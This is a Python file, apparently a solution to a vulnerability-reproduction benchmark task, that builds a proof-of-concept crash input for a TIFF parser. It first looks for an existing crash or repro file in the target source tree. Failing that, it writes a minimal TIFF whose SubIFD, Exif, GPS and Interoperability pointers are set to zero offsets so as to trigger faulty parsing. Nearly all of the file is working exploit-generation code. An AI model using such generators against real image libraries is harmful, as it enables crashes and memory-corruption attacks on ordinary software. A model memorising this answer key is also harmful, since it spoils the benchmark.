import os
import io
import tarfile
import zipfile
from typing import Optional, Set, Tuple, List


def _is_tiff_header(b: bytes) -> bool:
    if len(b) < 4:
        return False
    if b[:2] == b"II" and b[2:4] == b"\x2a\x00":
        return True
    if b[:2] == b"MM" and b[2:4] == b"\x00\x2a":
        return True
    return False


def _iter_archive_members(src_path: str):
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not os.path.isfile(p):
                    continue
                yield ("file", p, fn, st.st_size, None)
        return

    lp = src_path.lower()
    if lp.endswith(".zip"):
        with zipfile.ZipFile(src_path, "r") as zf:
            for zi in zf.infolist():
                if zi.is_dir():
                    continue
                yield ("zip", zf, zi.filename, os.path.basename(zi.filename), zi.file_size, zi)
        return

    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            yield ("tar", tf, m.name, os.path.basename(m.name), m.size, m)


def _read_member(kind, container, member_or_path, max_bytes: Optional[int] = None) -> Optional[bytes]:
    try:
        if kind == "file":
            with open(member_or_path, "rb") as f:
                return f.read() if max_bytes is None else f.read(max_bytes)
        if kind == "zip":
            zf: zipfile.ZipFile = container
            zi = member_or_path
            with zf.open(zi, "r") as f:
                return f.read() if max_bytes is None else f.read(max_bytes)
        if kind == "tar":
            tf: tarfile.TarFile = container
            m = member_or_path
            f = tf.extractfile(m)
            if f is None:
                return None
            with f:
                return f.read() if max_bytes is None else f.read(max_bytes)
    except Exception:
        return None
    return None


def _find_embedded_poc(src_path: str) -> Optional[bytes]:
    best = None
    best_len = None
    try:
        for it in _iter_archive_members(src_path):
            if it[0] == "file":
                _, path, base, size, _ = it
                name = base.lower()
                if size <= 0 or size > 4096:
                    continue
                if not (name.endswith((".tif", ".tiff", ".bin", ".dat", ".poc")) or ("crash" in name) or ("repro" in name) or ("poc" in name)):
                    continue
                b = _read_member("file", None, path)
                if not b:
                    continue
                if not _is_tiff_header(b):
                    continue
                if best is None or len(b) < best_len:
                    best = b
                    best_len = len(b)
            else:
                kind, container, full_name, base, size, member = it
                name = base.lower()
                if size <= 0 or size > 4096:
                    continue
                if not (name.endswith((".tif", ".tiff", ".bin", ".dat", ".poc")) or ("crash" in name) or ("repro" in name) or ("poc" in name)):
                    continue
                b = _read_member(kind, container, member)
                if not b:
                    continue
                if not _is_tiff_header(b):
                    continue
                if best is None or len(b) < best_len:
                    best = b
                    best_len = len(b)
    except Exception:
        return None
    return best


def _detect_supported_offline_tags(src_path: str) -> Set[int]:
    candidates = {
        330: (b"subifd", b"subifds", b"0x014a", b"014a", b"tag 330", b"330"),
        34665: (b"exififd", b"exif_ifd", b"exif", b"0x8769", b"8769", b"34665"),
        34853: (b"gpsinfo", b"gps_ifd", b"gps", b"0x8825", b"8825", b"34853"),
        40965: (b"interoperability", b"interop", b"0xa005", b"a005", b"40965"),
    }

    exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".java", ".rs", ".go", ".py")
    found: Set[int] = set()
    max_total = 6_000_000
    total = 0

    try:
        for it in _iter_archive_members(src_path):
            if total >= max_total or len(found) == len(candidates):
                break

            if it[0] == "file":
                _, path, base, size, _ = it
                name = base.lower()
                if not name.endswith(exts):
                    continue
                if size <= 0 or size > 1_500_000:
                    continue
                b = _read_member("file", None, path)
            else:
                kind, container, full_name, base, size, member = it
                name = base.lower()
                if not name.endswith(exts):
                    continue
                if size <= 0 or size > 1_500_000:
                    continue
                b = _read_member(kind, container, member)

            if not b:
                continue
            total += len(b)
            lb = b.lower()

            for tag, pats in candidates.items():
                if tag in found:
                    continue
                if any(p in lb for p in pats):
                    found.add(tag)
    except Exception:
        pass

    return found


def _pack_u16_le(x: int) -> bytes:
    return bytes((x & 0xFF, (x >> 8) & 0xFF))


def _pack_u32_le(x: int) -> bytes:
    return bytes((x & 0xFF, (x >> 8) & 0xFF, (x >> 16) & 0xFF, (x >> 24) & 0xFF))


def _make_tiff_poc(include_tags: Set[int]) -> bytes:
    TYPE_SHORT = 3
    TYPE_LONG = 4

    entries: List[Tuple[int, int, int, int]] = []

    # Minimal 1x1, 8bpp, uncompressed, 1 strip
    entries.append((256, TYPE_LONG, 1, 1))  # ImageWidth
    entries.append((257, TYPE_LONG, 1, 1))  # ImageLength
    entries.append((258, TYPE_SHORT, 1, 8))  # BitsPerSample
    entries.append((259, TYPE_SHORT, 1, 1))  # Compression = None
    entries.append((262, TYPE_SHORT, 1, 1))  # PhotometricInterpretation = BlackIsZero
    entries.append((277, TYPE_SHORT, 1, 1))  # SamplesPerPixel
    entries.append((278, TYPE_LONG, 1, 1))  # RowsPerStrip
    entries.append((279, TYPE_LONG, 1, 1))  # StripByteCounts
    # StripOffsets placeholder; computed after N known
    entries.append((273, TYPE_LONG, 1, 0))

    # Offline tags with zero offset
    if 330 in include_tags:
        entries.append((330, TYPE_LONG, 2, 0))  # SubIFDs: count>1 but offset=0 (invalid)
    if 34665 in include_tags:
        entries.append((34665, TYPE_LONG, 1, 0))  # ExifIFDPointer = 0
    if 34853 in include_tags:
        entries.append((34853, TYPE_LONG, 1, 0))  # GPSInfoIFDPointer = 0
    if 40965 in include_tags:
        entries.append((40965, TYPE_LONG, 1, 0))  # InteroperabilityIFDPointer = 0

    entries.sort(key=lambda t: t[0])
    n = len(entries)

    ifd_offset = 8
    end_ifd = ifd_offset + 2 + 12 * n + 4
    strip_off = end_ifd

    # Patch StripOffsets
    patched = []
    for tag, typ, cnt, val in entries:
        if tag == 273 and typ == TYPE_LONG and cnt == 1:
            patched.append((tag, typ, cnt, strip_off))
        else:
            patched.append((tag, typ, cnt, val))
    entries = patched

    out = bytearray()
    out += b"II"
    out += _pack_u16_le(42)
    out += _pack_u32_le(ifd_offset)

    out += _pack_u16_le(n)
    for tag, typ, cnt, val in entries:
        out += _pack_u16_le(tag)
        out += _pack_u16_le(typ)
        out += _pack_u32_le(cnt)
        out += _pack_u32_le(val)
    out += _pack_u32_le(0)  # next IFD offset

    if len(out) < strip_off:
        out += b"\x00" * (strip_off - len(out))
    out += b"\x00"  # 1 pixel

    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = _find_embedded_poc(src_path)
        if poc is not None and len(poc) > 0:
            return poc

        found = _detect_supported_offline_tags(src_path)
        if not found:
            found = {330, 34665, 34853}
        else:
            found |= {330}
        return _make_tiff_poc(found)